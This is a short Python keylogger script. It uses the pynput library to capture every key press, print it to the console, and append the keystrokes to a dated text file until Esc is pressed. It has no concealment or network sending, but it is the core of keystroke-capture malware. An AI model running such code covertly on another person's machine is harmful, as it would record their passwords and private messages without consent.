import pynput
from pynput.keyboard import Key, Listener
from datetime import datetime

count = 0
keys = []


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print(f"{key} pressed")

    # Empty the `keys` list and reset the `count` to zero while transfering the data to the file
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(f"logs\\log_{datetime.today().strftime('%Y-%m-%d')}.txt", "a") as file:
        for key in keys:
            k = str(key).replace("'", "\n")
            if k.find("space") > 0:
                file.write("")
            elif k.find("Key") == -1:
                file.write(k)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
